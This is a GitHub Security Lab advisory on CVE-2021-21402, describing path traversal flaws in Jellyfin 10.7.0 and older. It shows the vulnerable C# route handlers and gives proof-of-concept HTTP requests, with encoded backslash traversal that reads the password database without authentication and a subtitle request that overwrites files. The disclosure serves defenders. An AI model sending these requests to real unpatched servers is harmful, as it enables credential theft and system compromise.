<header class="post-header d-block mb-6">
      <div class="date text-mono f5 my-3">April 1, 2021</div>
      <h1 class="my-2 h00-mktg lh-condensed">GHSL-2021-050: Unauthenticated abritrary file read in Jellyfin - CVE-2021-21402</h1>

      
      
      
      
      

      

      <a target="_blank" class="sc-frDJqD SgxRc d-inline-flex flex-row flex-items-center text-gray" href="https://github.com/jarlob">
        <img class="mr-3" src="https://avatars.githubusercontent.com/u/26652396?s=35" height="35" width="35">
        <span>Jaroslav Lobacevski</span>
      </a>
    </header>

    <main id="content" class="markdown-body" aria-label="Content">
      
<h2 id="coordinated-disclosure-timeline">Coordinated Disclosure Timeline</h2>

<ul>
  <li>2021-03-19: Issue reported to maintainers.</li>
  <li>2021-03-22: Version 10.7.1 with fixes was released.</li>
</ul>

<h2 id="summary">Summary</h2>

<p>Jellyfin allows unauthenticated arbitrary file read.</p>

<h2 id="product">Product</h2>

<p>Jellyfin</p>

<h2 id="tested-version">Tested Version</h2>

<p>The latest 10.7.0 and older</p>

<h2 id="details">Details</h2>

<h3 id="issue-1-unauthenticated-arbitrary-file-read-in-audioitemidhlssegmentidstreammp3-and-audioitemidhlssegmentidstreamaac">Issue 1: Unauthenticated arbitrary file read in <code class="language-plaintext highlighter-rouge">/Audio/itemId/hls/segmentId/stream.mp3</code> and <code class="language-plaintext highlighter-rouge">/Audio/itemId/hls/segmentId/stream.aac</code></h3>

<p>Both the <code class="language-plaintext highlighter-rouge">/Audio/{Id}/hls/{segmentId}/stream.mp3</code> and <code class="language-plaintext highlighter-rouge">/Audio/{Id}/hls/{segmentId}/stream.aac</code> routes allow unauthenticated [1] arbitrary file read on Windows. It is possible to set the <code class="language-plaintext highlighter-rouge">{segmentId}</code> part of the route to a relative or absolute path using the Windows path separator <code class="language-plaintext highlighter-rouge">\</code> (<code class="language-plaintext highlighter-rouge">%5C</code> when URL encoded). Initially, it may seem like an attacker would only be able to read files ending with <code class="language-plaintext highlighter-rouge">.mp3</code> and <code class="language-plaintext highlighter-rouge">.aac</code> [2]. However, by using a trailing slash in the URL path it is possible to make <code class="language-plaintext highlighter-rouge">Path.GetExtension(Request.Path)</code> return an empty extension, thus obtaining full control of the resulting file path. The <code class="language-plaintext highlighter-rouge">itemId</code> doesn’t matter as it is not used. The issue is not limited to Jellyfin files as it allows reading any file from the file system.</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Can't require authentication just yet due to seeing some requests come from Chrome without full query string</span>
<span class="c1">// [Authenticated] // [1]</span>
<span class="p">[</span><span class="nf">HttpGet</span><span class="p">(</span><span class="s">"Audio/{itemId}/hls/{segmentId}/stream.mp3"</span><span class="p">,</span> <span class="n">Name</span> <span class="p">=</span> <span class="s">"GetHlsAudioSegmentLegacyMp3"</span><span class="p">)]</span>
<span class="p">[</span><span class="nf">HttpGet</span><span class="p">(</span><span class="s">"Audio/{itemId}/hls/{segmentId}/stream.aac"</span><span class="p">,</span> <span class="n">Name</span> <span class="p">=</span> <span class="s">"GetHlsAudioSegmentLegacyAac"</span><span class="p">)]</span>
<span class="c1">//...</span>
<span class="k">public</span> <span class="n">ActionResult</span> <span class="nf">GetHlsAudioSegmentLegacy</span><span class="p">([</span><span class="n">FromRoute</span><span class="p">,</span> <span class="n">Required</span><span class="p">]</span> <span class="kt">string</span> <span class="n">itemId</span><span class="p">,</span> <span class="p">[</span><span class="n">FromRoute</span><span class="p">,</span> <span class="n">Required</span><span class="p">]</span> <span class="kt">string</span> <span class="n">segmentId</span><span class="p">)</span>
<span class="p">{</span>
    <span class="c1">// TODO: Deprecate with new iOS app</span>
    <span class="kt">var</span> <span class="n">file</span> <span class="p">=</span> <span class="n">segmentId</span> <span class="p">+</span> <span class="n">Path</span><span class="p">.</span><span class="nf">GetExtension</span><span class="p">(</span><span class="n">Request</span><span class="p">.</span><span class="n">Path</span><span class="p">);</span> <span class="c1">//[2]</span>
    <span class="n">file</span> <span class="p">=</span> <span class="n">Path</span><span class="p">.</span><span class="nf">Combine</span><span class="p">(</span><span class="n">_serverConfigurationManager</span><span class="p">.</span><span class="nf">GetTranscodePath</span><span class="p">(),</span> <span class="n">file</span><span class="p">);</span>

    <span class="k">return</span> <span class="n">FileStreamResponseHelpers</span><span class="p">.</span><span class="nf">GetStaticFileResult</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="n">MimeTypes</span><span class="p">.</span><span class="nf">GetMimeType</span><span class="p">(</span><span class="n">file</span><span class="p">)!,</span> <span class="k">false</span><span class="p">,</span> <span class="n">HttpContext</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>The following request for example would download the <code class="language-plaintext highlighter-rouge">jellyfin.db</code> database with passwords from the server:</p>

<p><code class="language-plaintext highlighter-rouge">GET /Audio/anything/hls/..%5Cdata%5Cjellyfin.db/stream.mp3/ HTTP/1.1</code></p>

<h4 id="impact">Impact</h4>

<p>This issue may lead to unauthorized access to the system especially when Jellyfin is <a href="https://jellyfin.org/docs/general/networking/index.html#running-jellyfin-behind-a-reverse-proxy">configured to be accessible from the Internet</a>.</p>

<h3 id="issue-2-unauthenticated-arbitrary-file-read-in-videosidhlsplaylistidsegmentidsegmentcontainer">Issue 2: Unauthenticated arbitrary file read in <code class="language-plaintext highlighter-rouge">/Videos/Id/hls/PlaylistId/SegmentId.SegmentContainer</code></h3>

<p>The <code class="language-plaintext highlighter-rouge">/Videos/{Id}/hls/{PlaylistId}/{SegmentId}.{SegmentContainer}</code> route allows unauthenticated [1] arbitrary file read on Windows. It is possible to set the <code class="language-plaintext highlighter-rouge">{SegmentId}.{SegmentContainer}</code> part of the route to a relative or absolute path using the Windows path separator <code class="language-plaintext highlighter-rouge">\</code> (<code class="language-plaintext highlighter-rouge">%5C</code> when URL encoded). The <code class="language-plaintext highlighter-rouge">SegmentId</code> and file extension from <code class="language-plaintext highlighter-rouge">Path</code> are concatenated [2]. The resulting <code class="language-plaintext highlighter-rouge">file</code> is used as the second parameter to <code class="language-plaintext highlighter-rouge">Path.Combine</code> [3]. However, if the second parameter is an absolute path, the first parameter to <code class="language-plaintext highlighter-rouge">Path.Combine</code> is ignored and the resulting path is just the absolute path <code class="language-plaintext highlighter-rouge">file</code>.</p>

<p>A pre-requisite for the attack is that the <code class="language-plaintext highlighter-rouge">jellyfin/transcodes</code> directory contains at least one <code class="language-plaintext highlighter-rouge">.m3u8</code> file [4] (i.e. some user started streaming a video or it is left there since the last stream). The <code class="language-plaintext highlighter-rouge">itemId</code> doesn’t matter as it is not used and <code class="language-plaintext highlighter-rouge">PlaylistId</code> must be a substring of the <code class="language-plaintext highlighter-rouge">m3u8</code> file [5]. It can be just <code class="language-plaintext highlighter-rouge">m</code> as it is always in the <code class="language-plaintext highlighter-rouge">*.m3u8</code> file name.</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Can't require authentication just yet due to seeing some requests come from Chrome without full query string</span>
<span class="c1">// [Authenticated] //[1]</span>
<span class="p">[</span><span class="nf">HttpGet</span><span class="p">(</span><span class="s">"Videos/{itemId}/hls/{playlistId}/{segmentId}.{segmentContainer}"</span><span class="p">)]</span>
<span class="c1">//...</span>
<span class="k">public</span> <span class="n">ActionResult</span> <span class="nf">GetHlsVideoSegmentLegacy</span><span class="p">(</span>
    <span class="p">[</span><span class="n">FromRoute</span><span class="p">,</span> <span class="n">Required</span><span class="p">]</span> <span class="kt">string</span> <span class="n">itemId</span><span class="p">,</span>
    <span class="p">[</span><span class="n">FromRoute</span><span class="p">,</span> <span class="n">Required</span><span class="p">]</span> <span class="kt">string</span> <span class="n">playlistId</span><span class="p">,</span>
    <span class="p">[</span><span class="n">FromRoute</span><span class="p">,</span> <span class="n">Required</span><span class="p">]</span> <span class="kt">string</span> <span class="n">segmentId</span><span class="p">,</span>
    <span class="p">[</span><span class="n">FromRoute</span><span class="p">,</span> <span class="n">Required</span><span class="p">]</span> <span class="kt">string</span> <span class="n">segmentContainer</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">var</span> <span class="n">file</span> <span class="p">=</span> <span class="n">segmentId</span> <span class="p">+</span> <span class="n">Path</span><span class="p">.</span><span class="nf">GetExtension</span><span class="p">(</span><span class="n">Request</span><span class="p">.</span><span class="n">Path</span><span class="p">);</span> <span class="c1">//[2]</span>
    <span class="kt">var</span> <span class="n">transcodeFolderPath</span> <span class="p">=</span> <span class="n">_serverConfigurationManager</span><span class="p">.</span><span class="nf">GetTranscodePath</span><span class="p">();</span>

    <span class="n">file</span> <span class="p">=</span> <span class="n">Path</span><span class="p">.</span><span class="nf">Combine</span><span class="p">(</span><span class="n">transcodeFolderPath</span><span class="p">,</span> <span class="n">file</span><span class="p">);</span> <span class="c1">//[3]</span>

    <span class="kt">var</span> <span class="n">normalizedPlaylistId</span> <span class="p">=</span> <span class="n">playlistId</span><span class="p">;</span>

    <span class="kt">var</span> <span class="n">filePaths</span> <span class="p">=</span> <span class="n">_fileSystem</span><span class="p">.</span><span class="nf">GetFilePaths</span><span class="p">(</span><span class="n">transcodeFolderPath</span><span class="p">);</span>
    <span class="c1">// Add . to start of segment container for future use.</span>
    <span class="n">segmentContainer</span> <span class="p">=</span> <span class="n">segmentContainer</span><span class="p">.</span><span class="nf">Insert</span><span class="p">(</span><span class="m">0</span><span class="p">,</span> <span class="s">"."</span><span class="p">);</span>
    <span class="kt">string</span><span class="p">?</span> <span class="n">playlistPath</span> <span class="p">=</span> <span class="k">null</span><span class="p">;</span>
    <span class="k">foreach</span> <span class="p">(</span><span class="kt">var</span> <span class="n">path</span> <span class="k">in</span> <span class="n">filePaths</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="kt">var</span> <span class="n">pathExtension</span> <span class="p">=</span> <span class="n">Path</span><span class="p">.</span><span class="nf">GetExtension</span><span class="p">(</span><span class="n">path</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">((</span><span class="kt">string</span><span class="p">.</span><span class="nf">Equals</span><span class="p">(</span><span class="n">pathExtension</span><span class="p">,</span> <span class="n">segmentContainer</span><span class="p">,</span> <span class="n">StringComparison</span><span class="p">.</span><span class="n">OrdinalIgnoreCase</span><span class="p">)</span>
                <span class="p">||</span> <span class="kt">string</span><span class="p">.</span><span class="nf">Equals</span><span class="p">(</span><span class="n">pathExtension</span><span class="p">,</span> <span class="s">".m3u8"</span><span class="p">,</span> <span class="n">StringComparison</span><span class="p">.</span><span class="n">OrdinalIgnoreCase</span><span class="p">))</span> <span class="c1">//[4]</span>
            <span class="p">&amp;&amp;</span> <span class="n">path</span><span class="p">.</span><span class="nf">IndexOf</span><span class="p">(</span><span class="n">normalizedPlaylistId</span><span class="p">,</span> <span class="n">StringComparison</span><span class="p">.</span><span class="n">OrdinalIgnoreCase</span><span class="p">)</span> <span class="p">!=</span> <span class="p">-</span><span class="m">1</span><span class="p">)</span> <span class="c1">//[5]</span>
        <span class="p">{</span>
            <span class="n">playlistPath</span> <span class="p">=</span> <span class="n">path</span><span class="p">;</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="n">playlistPath</span> <span class="p">==</span> <span class="k">null</span>
        <span class="p">?</span> <span class="nf">NotFound</span><span class="p">(</span><span class="s">"Hls segment not found."</span><span class="p">)</span>
        <span class="p">:</span> <span class="nf">GetFileResult</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="n">playlistPath</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>PoC:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /Videos/anything/hls/m/..%5Cdata%5Cjellyfin.db HTTP/1.1
</code></pre></div></div>

<h4 id="impact-1">Impact</h4>

<p>This issue may lead to unauthorized access to the system especially when Jellyfin is <a href="https://jellyfin.org/docs/general/networking/index.html#running-jellyfin-behind-a-reverse-proxy">configured to be accessible from the Internet</a>.</p>

<h3 id="issue-3-authenticated-arbitrary-file-read-in-videosidhlsplaylistidstreamm3u8">Issue 3: Authenticated arbitrary file read in <code class="language-plaintext highlighter-rouge">/Videos/Id/hls/PlaylistId/stream.m3u8</code></h3>

<p><code class="language-plaintext highlighter-rouge">/Videos/{Id}/hls/{PlaylistId}/stream.m3u8</code> allows arbitrary file read on Windows. In this case it requires authentication. It may seem like an attacker would only be able to read files ending with <code class="language-plaintext highlighter-rouge">.m3u8</code>[1]. However, by using a trailing slash in the URL path it is possible to make <code class="language-plaintext highlighter-rouge">Path.GetExtension(Request.Path)</code> return an empty extension, thus obtaining full control of the resulting file path.  The <code class="language-plaintext highlighter-rouge">itemId</code> doesn’t matter as it is not used.</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="nf">HttpGet</span><span class="p">(</span><span class="s">"Videos/{itemId}/hls/{playlistId}/stream.m3u8"</span><span class="p">)]</span>
<span class="p">[</span><span class="nf">Authorize</span><span class="p">(</span><span class="n">Policy</span> <span class="p">=</span> <span class="n">Policies</span><span class="p">.</span><span class="n">DefaultAuthorization</span><span class="p">)]</span>
<span class="c1">//...</span>
<span class="k">public</span> <span class="n">ActionResult</span> <span class="nf">GetHlsPlaylistLegacy</span><span class="p">([</span><span class="n">FromRoute</span><span class="p">,</span> <span class="n">Required</span><span class="p">]</span> <span class="kt">string</span> <span class="n">itemId</span><span class="p">,</span> <span class="p">[</span><span class="n">FromRoute</span><span class="p">,</span> <span class="n">Required</span><span class="p">]</span> <span class="kt">string</span> <span class="n">playlistId</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">var</span> <span class="n">file</span> <span class="p">=</span> <span class="n">playlistId</span> <span class="p">+</span> <span class="n">Path</span><span class="p">.</span><span class="nf">GetExtension</span><span class="p">(</span><span class="n">Request</span><span class="p">.</span><span class="n">Path</span><span class="p">);</span> <span class="c1">//[1]</span>
    <span class="n">file</span> <span class="p">=</span> <span class="n">Path</span><span class="p">.</span><span class="nf">Combine</span><span class="p">(</span><span class="n">_serverConfigurationManager</span><span class="p">.</span><span class="nf">GetTranscodePath</span><span class="p">(),</span> <span class="n">file</span><span class="p">);</span>

    <span class="k">return</span> <span class="nf">GetFileResult</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="n">file</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>PoC:</p>

<p><code class="language-plaintext highlighter-rouge">GET /Videos/anything/hls/..%5Cdata%5Cjellyfin.db/stream.m3u8/?api_key=4c5750626da14b0a804977b09bf3d8f7 HTTP/1.1</code></p>

<h4 id="impact-2">Impact</h4>

<p>This issue may lead to privilege elevation.</p>

<h3 id="issue-4-unauthenticated-arbitrary-image-file-read-in-imagesratingsthemename-imagesmediainfothemename-and-imagesgeneralnametype">Issue 4: Unauthenticated arbitrary image file read in <code class="language-plaintext highlighter-rouge">/Images/Ratings/theme/name</code>, <code class="language-plaintext highlighter-rouge">/Images/MediaInfo/theme/name</code> and <code class="language-plaintext highlighter-rouge">Images/General/name/type</code></h3>

<p>The <code class="language-plaintext highlighter-rouge">/Images/Ratings/{theme}/{name}</code>, <code class="language-plaintext highlighter-rouge">/Images/MediaInfo/{theme}/{name}</code> and <code class="language-plaintext highlighter-rouge">/Images/General/{name}/{type}</code> routes allow unauthenticated arbitrary <em>image</em> file read on Windows. It is possible to set the <code class="language-plaintext highlighter-rouge">{theme}</code>[1] or <code class="language-plaintext highlighter-rouge">{name}</code>[2] part of the route to a relative or absolute path using the Windows path separator <code class="language-plaintext highlighter-rouge">\</code> (<code class="language-plaintext highlighter-rouge">%5C</code> when URL encoded). The route automatically appends the following allowed extensions, so it is only possible to read image files [3]: <code class="language-plaintext highlighter-rouge">.png</code>, <code class="language-plaintext highlighter-rouge">.jpg</code>, <code class="language-plaintext highlighter-rouge">.jpeg</code>, <code class="language-plaintext highlighter-rouge">.tbn</code>, <code class="language-plaintext highlighter-rouge">.gif</code>.</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="nf">HttpGet</span><span class="p">(</span><span class="s">"MediaInfo/{theme}/{name}"</span><span class="p">)]</span>
<span class="p">[</span><span class="n">AllowAnonymous</span><span class="p">]</span>
<span class="c1">//...</span>
<span class="k">public</span> <span class="n">ActionResult</span> <span class="nf">GetMediaInfoImage</span><span class="p">(</span>
    <span class="p">[</span><span class="n">FromRoute</span><span class="p">,</span> <span class="n">Required</span><span class="p">]</span> <span class="kt">string</span> <span class="n">theme</span><span class="p">,</span>
    <span class="p">[</span><span class="n">FromRoute</span><span class="p">,</span> <span class="n">Required</span><span class="p">]</span> <span class="kt">string</span> <span class="n">name</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">return</span> <span class="nf">GetImageFile</span><span class="p">(</span><span class="n">_applicationPaths</span><span class="p">.</span><span class="n">MediaInfoImagesPath</span><span class="p">,</span> <span class="n">theme</span><span class="p">,</span> <span class="n">name</span><span class="p">);</span>
<span class="p">}</span>
<span class="c1">//...</span>
<span class="k">private</span> <span class="n">ActionResult</span> <span class="nf">GetImageFile</span><span class="p">(</span><span class="kt">string</span> <span class="n">basePath</span><span class="p">,</span> <span class="kt">string</span> <span class="n">theme</span><span class="p">,</span> <span class="kt">string</span><span class="p">?</span> <span class="n">name</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">var</span> <span class="n">themeFolder</span> <span class="p">=</span> <span class="n">Path</span><span class="p">.</span><span class="nf">Combine</span><span class="p">(</span><span class="n">basePath</span><span class="p">,</span> <span class="n">theme</span><span class="p">);</span> <span class="c1">//[1]</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">Directory</span><span class="p">.</span><span class="nf">Exists</span><span class="p">(</span><span class="n">themeFolder</span><span class="p">))</span>
    <span class="p">{</span>
        <span class="kt">var</span> <span class="n">path</span> <span class="p">=</span> <span class="n">BaseItem</span><span class="p">.</span><span class="n">SupportedImageExtensions</span><span class="p">.</span><span class="nf">Select</span><span class="p">(</span><span class="n">i</span> <span class="p">=&gt;</span> <span class="n">Path</span><span class="p">.</span><span class="nf">Combine</span><span class="p">(</span><span class="n">themeFolder</span><span class="p">,</span> <span class="n">name</span> <span class="p">+</span> <span class="n">i</span><span class="p">)</span><span class="cm">/*[2]*/</span><span class="p">)</span> <span class="c1">//[3]</span>
            <span class="p">.</span><span class="nf">FirstOrDefault</span><span class="p">(</span><span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">File</span><span class="p">.</span><span class="n">Exists</span><span class="p">);</span>

        <span class="k">if</span> <span class="p">(!</span><span class="kt">string</span><span class="p">.</span><span class="nf">IsNullOrEmpty</span><span class="p">(</span><span class="n">path</span><span class="p">)</span> <span class="p">&amp;&amp;</span> <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">File</span><span class="p">.</span><span class="nf">Exists</span><span class="p">(</span><span class="n">path</span><span class="p">))</span>
        <span class="p">{</span>
            <span class="kt">var</span> <span class="n">contentType</span> <span class="p">=</span> <span class="n">MimeTypes</span><span class="p">.</span><span class="nf">GetMimeType</span><span class="p">(</span><span class="n">path</span><span class="p">);</span>
            <span class="k">return</span> <span class="nf">PhysicalFile</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">contentType</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
</code></pre></div></div>

<p>PoCs to download <code class="language-plaintext highlighter-rouge">c:\temp\filename.jpg</code>:</p>

<p><code class="language-plaintext highlighter-rouge">GET /Images/Ratings/c:%5ctemp/filename HTTP/1.1</code></p>

<p><code class="language-plaintext highlighter-rouge">GET /Images/Ratings/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5ctemp/filename HTTP/1.1</code></p>

<h4 id="impact-3">Impact</h4>

<p>This issue may lead to unauthorized access to image files especially when Jellyfin is <a href="https://jellyfin.org/docs/general/networking/index.html#running-jellyfin-behind-a-reverse-proxy">configured to be accessible from the Internet</a>.</p>

<h3 id="issue-5-authenticated-arbitrary-file-overwrite-in-videositemidsubtitles-not-limited-to-windows">Issue 5: Authenticated arbitrary file overwrite in <code class="language-plaintext highlighter-rouge">/Videos/itemId/Subtitles</code> not limited to Windows</h3>

<p><code class="language-plaintext highlighter-rouge">Videos/{itemId}/Subtitles</code> allows arbitrary file overwrite by an elevated user. Since it requires administrator permissions, it is not clear if this crosses security boundaries.</p>

<p>PoC:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /Videos/d7634eb0064cce760f3f0bf8282c16cd/Subtitles HTTP/1.1
...
X-Emby-Authorization: MediaBrowser DeviceId="...", Version="10.7.0", Token="..."
...

{"language":".\\..\\","format":".\\..\\test.bin","isForced":false,"data":"base64 encoded data"}
</code></pre></div></div>

<h4 id="impact-4">Impact</h4>

<p>This issue may lead to post-authenticated arbitrary remote code execution.</p>

<h2 id="cve">CVE</h2>

<ul>
  <li>CVE-2021-21402</li>
</ul>

<h2 id="credit">Credit</h2>

<p>This issue was discovered and reported by GHSL team member <a href="https://github.com/JarLob">@JarLob (Jaroslav Lobačevski)</a>.</p>

<h2 id="contact">Contact</h2>

<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include a reference to <code class="language-plaintext highlighter-rouge">GHSL-2021-050</code> in any communication regarding this issue.</p>